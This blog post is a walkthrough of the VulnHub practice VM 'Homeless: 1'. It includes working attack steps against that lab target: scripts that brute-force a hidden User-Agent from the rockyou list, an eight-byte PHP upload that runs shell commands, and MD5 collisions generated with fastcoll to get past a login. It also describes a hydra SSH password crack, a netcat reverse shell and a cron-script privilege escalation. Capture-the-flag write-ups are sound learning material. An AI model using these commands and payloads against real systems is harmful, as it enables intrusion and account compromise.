---
layout: post
last_modified_at: 2018-06-07 17:05:37 +0000
title: "Homeless: 1 Walkthrough"
category: Walkthrough
tags: [VulnHub, Homeless]
comments: true
image:
  feature: homeless-1-walkthrough.jpg
  credit: MichiArt / Pixabay
  creditlink: https://pixabay.com/en/homeless-beggar-sleeping-street-2182114/
---

This post documents the complete walkthrough of Homeless: 1, a boot2root [VM][1] created by [Min Ko Ko][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background
**Warning**, this challenge is not for beginners. :smiling_imp:

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 28:2c:a5:57:c7:eb:82:11:4e:bc:10:45:2f:68:58:f0 (RSA)
|_  256 4d:44:7b:95:ce:9f:86:e2:c8:b4:1c:53:85:0d:90:4a (ECDSA)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-favicon: Unknown favicon MD5: 35C5F7F583E3A0D4947237506D4676B3
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_Use Brain with Google
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Transitive by TEMPLATED
```

As usual, let's start with the web service since `robots.txt` is available. There may be clues in it.

```
# curl -s 192.168.198.130/robots.txt
User-agent: *
Disallow: Use Brain with Google


Good luck!
Hey Remember rockyou..
```

Apparently, "Use Brain with Google" is not a real path. There's also a hint about the famed "rockyou" password list.

This is how the site looks like in my browser.

![screenshot-1](/assets/images/posts/homeless-walkthrough/screenshot-1.png){: style="display: block"}
![screenshot-2](/assets/images/posts/homeless-walkthrough/screenshot-2.png){: style="display: block"}

Notice anything unusual? The browser's `User-Agent` string is there. In the HTML source code, something else stands out as well.

![screenshot-3](/assets/images/posts/homeless-walkthrough/screenshot-3.png)

A hint to check something. But what to check? Perhaps to check the `User-Agent` string on line 32 of the HTML source code?

![screenshot-4](/assets/images/posts/homeless-walkthrough/screenshot-4.png)

The nifty `curl` has an option to submit user-supplied `User-Agent` string as part of the HTTP request to a site. To that end, I wrote `check.sh`, a `bash` script, to submit a custom `User-Agent` string and then check for the HTTP response at line 32.

{% highlight bash linenos %}
# cat check.sh
#!/bin/bash

HOST=192.168.198.130
UA=$1

RESP=$(curl -s -A "$UA" $HOST \
       | sed '32!d' \
       | sed -r -e 's/^[ \t]+//' -e 's/\t+.*$//')

echo $RESP
{% endhighlight %}

Indeed, Line 32 of the HTTP response always shows the supplied `User-Agent` string.

### Finding the Way Home

Recall the hint about the "rockyou" password list? Perhaps the secret to finding the way home is by submitting one of the entries in the list as `User-Agent` to the site?

There's one problem. Rockyou password list has about 14 million entries. It'll take ages to submit the entries one at a time. Surely, we need some form of parallelism.

For that, I'm using [parallel][4], a command-line driven utility for Linux and other Unix-like operating systems which allows the user to execute shell scripts in parallel.

I expand `check.sh` to include logic to stop when line 32 of the HTTP response is different from the supplied `User-Agent` string.

{% highlight bash linenos %}
# cat check.sh
#!/bin/bash

HOST=192.168.198.130
UA=$1

die() {
    for pid in $(ps aux \
                 | grep -v grep \
                 | grep brute \
                 | awk '{ print $2 }'); do
        kill -9 $pid &>/dev/null
    done
}

RESP=$(curl -s -A "$UA" $HOST \
       | sed '32!d' \
       | sed -r -e 's/^[ \t]+//' -e 's/\t+.*$//')

if [ "$UA" != "$RESP" ]; then
    echo "[!] Found: \"$UA\" - $RESP"
    die
fi
{% endhighlight %}

On top of that, I wrote `brute.sh`, a wrapper script to feed a wordlist to `check.sh` in parallel, taking advantage of my multi-core Kali Linux VM.

{% highlight bash linenos %}
# cat brute.sh
#!/bin/bash

parallel ./check.sh < $1 >> $2
{% endhighlight %}

I reduce the size of the "rockyou" list by preserving alphanumeric characters and splitting the list into sub-lists of 1000 lines each.

```
# grep -Pao '^[a-zA-Z0-9]+$' rockyou.txt > reducio.txt
# split -a5 reducio.txt -d reducio_
```

I also use `parallel` to run `check.sh` in parallel to max out my CPU like so.

```
# parallel ./brute.sh {} booyah.txt ::: reducio_*
```

The script took about 21 minutes to complete. The result is in `booyah.txt`.

```
# cat booyah.txt
[!] Found: "cyberdog" - Nice Cache!.. Go there.. myuploader_priv
```

As long as the password has "cyberbog", it's able to unlock the path to home.

```
# ./check.sh "old school cyberdog"
[!] Found: "old school cyberdog" - Nice Cache!.. Go there.. myuploader_priv
```

On hindsight, I could have unlocked the secret backdoor by looking at the `favicon`. The title says "Cyberdog Starting Point", paying a little homage to Cyberdog, an Internet suite of applications, developed by Apple.

![favicon](/assets/images/posts/homeless-walkthrough/favicon.jpg)

### Uploader Page

There's an uploader page at `/myuploader_priv`.

![screenshot-5](/assets/images/posts/homeless-walkthrough/screenshot-5.png)

After some tinkering with the uploader page, this is what I observe:

* The file can be of any content type; and
* The file size must be less than or equals to eight bytes; and
* A new upload will replace the previous one.

This is how I imagine the PHP code of the uploader page to look like.

{% highlight php linenos %}
<?php
    if (!empty($_FILES['upme']['name'])) {
        $path = "files/";

        if ($_FILES['upme']['size'] > 8) {
            echo "Your file is too large";
        } else {
            array_map("unlink", glob($path . "*"));
            $index = fopen($path . "index.php", "w");
            fclose($index);
            $path = $path . basename($_FILES['upme']['name']);
            move_uploaded_file($_FILES['upme']['tmp_name'], $path);
            echo "File uploaded. Find the secret file on server .. " . $path;
        }
    }
?>
{% endhighlight %}

### PHP Tags and Execution Operators

Gathering the restrictions from above, the challenge now is to write a short and valid PHP code of no more than eight bytes. PHP supports [short open tag][5] (<tt><?=</tt>) and [execution operators][6] (<tt>\`&hellip;\`</tt>). Using these two short forms, I'm able to squeeze in eight bytes of valid PHP code to list the files in `/myuploader_priv/files` like so.

```shell
echo -n '<?=`ls`;' > test.php
```

![screenshot-6](/assets/images/posts/homeless-walkthrough/screenshot-6.png)

![screenshot-7](/assets/images/posts/homeless-walkthrough/screenshot-7.png)

![screenshot-8](/assets/images/posts/homeless-walkthrough/screenshot-8.png)

### Secure Login Page

There's a Secure Login page at `/d5fa314e8577e3a7b8534a014b4dcb221de823ad`.

![screenshot-9](/assets/images/posts/homeless-walkthrough/screenshot-9.png)

A hint is at the top right corner of the "Sign In" form. Clicking it reveals the PHP code of this page.

{% highlight php linenos %}
<?php
session_start();
error_reporting(0);


    if (@$_POST['username'] and @$_POST['password'] and @$_POST['code'])
    {

        $username = (string)$_POST['username'];
        $password = (string)$_POST['password'];
        $code     = (string)$_POST['code'];

        if (($username == $password ) or ($username == $code)  or ($password == $code)) {

            echo 'Your input can not be the same.';

        } else if ((md5($username) === md5($password) ) and (md5($password) === md5($code)) ) {
            $_SESSION["secret"] = '133720';
            header('Location: admin.php');  
            exit();

        } else {

            echo "<pre> Invalid password </pre>";
        }
    }


?>
{% endhighlight %}

I'm no cryptography expert but it's obvious that this challenge requires MD5 collisions to bypass the Secure Login page. I'll need 3 different strings that will result in the same MD5 hash.

I found an informative [page][7] detailing how one can generate 2<sup>N</sup> collisions using `fastcoll`, a fast MD5 collision generator written by Marc Stevens.

Suffice to say, I've downloaded the [source](https://github.com/brimstone/fastcoll) code of `fastcoll` and compile it with `libboost-all-dev` dependency.

```
# apt-get install libboost-all-dev
# g++ -O3 *.cpp -lboost_filesystem -lboost_program_options -lboost_system -o fastcoll
```

Following the steps from the page, I wrote `gen.sh`, a helper script to generate four colliding blobs encoded in [Percent-encoding][8].

{% highlight bash linenos %}
# cat gen.sh
#!/bin/bash

./fastcoll -o 0 1
./fastcoll -p 1 -o 00 01
tail -c 128 00 > a
tail -c 128 01 > b
cat 0 a > 10
cat 0 b > 11

rm 0 1 a b; clear

echo "[!] MD5 of blobs"
md5sum 00 01 10 11

printf "\n"

echo "[!] SHA1 of blobs"
sha1sum 00 01 10 11

for file in 00 01 10 11; do
    tmp=$(mktemp -u)
    xxd -p $file \
    | tr -d '\n' \
    | sed -r 's/(..)/%\1/g' > $tmp
    rm $file && mv $tmp $file
done
{% endhighlight %}

### On a Collision Course

Using `curl` to submit three colliding blobs as `username`, `password` and `code` respectively, I'm able to get a session and access `admin.php` like so.

```
# curl -i -d "username=$(cat collisions/00)" -d "password=$(cat collisions/01)" -d "code=$(cat collisions/10)" -d "login=Login" http://192.168.198.130/d5fa314e8577e3a7b8534a014b4dcb221de823ad/
HTTP/1.1 100 Continue

HTTP/1.1 302 Found
Date: Sun, 25 Feb 2018 14:23:04 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=teb2cojqo1337m3kuqj8dfb602; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: admin.php
Content-Length: 10
Content-Type: text/html; charset=UTF-8

Well done!
```

I replace the existing session cookie with the one above to display `admin.php`.

![screenshot-10](/assets/images/posts/homeless-walkthrough/screenshot-10.png)

### Low Privilege Shell

The terminal allows remote command execution and `nc` with `-e` is available.

![screenshot-11](/assets/images/posts/homeless-walkthrough/screenshot-11.png)

I can use `nc` to run a low-privilege reverse shell back.

![screenshot-12](/assets/images/posts/homeless-walkthrough/screenshot-12.png)

I come across the user `downfall` and the contents of his/her home directory during enumeration of the system.

![screenshot-13](/assets/images/posts/homeless-walkthrough/screenshot-13.png)

### Hail Hydra!

The creator of this VM is kind enough to suggest that the password starts with "sec".

```
# grep -Pao '^sec.*$' /usr/share/wordlists/rockyou.txt > seclist.txt
```

Using `hydra`, I was able to crack the SSH password of `downfall` rather quick and hassle-free.

```
# hydra -l downfall -P seclist.txt -f -o hydra.txt -t 4 ssh://192.168.198.130
[22][ssh] host: 192.168.198.130   login: downfall   password: secretlyinlove
```

Armed with the SSH password, I'm able to login as `downfall` and view the contents of `.secret_message`.

![screenshot-14](/assets/images/posts/homeless-walkthrough/screenshot-14.png)

### Privilege Escalation

I notice that `downfall` is able to edit `/lib/logs/homeless.py`. On top of that, there's a `cron` job running in the context of `root` every minute, executing:

`cd /lib/logs/ && ./homeless.py`

This is how `homeless.py` looks like.

![screenshot-15](/assets/images/posts/homeless-walkthrough/screenshot-15.png)

Combining all the above information, I can probably edit `homeless.py` as follows:

![screenshot-16](/assets/images/posts/homeless-walkthrough/screenshot-16.png)

A minute later, a `root` shell appears on my `netcat` listener.

![screenshot-17](/assets/images/posts/homeless-walkthrough/screenshot-17.png)

:dancer:

### All Your Base Are Belong to Us

Getting the flag when you have a `root` shell, is trivial. :laughing:

![screenshot-18](/assets/images/posts/homeless-walkthrough/screenshot-18.png)

[1]: https://www.vulnhub.com/entry/homeless-1,215/
[2]: http://www.creatigon.com/
[3]: https://www.vulnhub.com
[4]: https://www.gnu.org/software/parallel/
[5]: http://php.net/manual/en/language.basic-syntax.phptags.php
[6]: http://php.net/manual/en/language.operators.execution.php
[7]: https://sfrolov.io/2016/09/multiple-md5-collisions
[8]: https://en.wikipedia.org/wiki/Percent-encoding
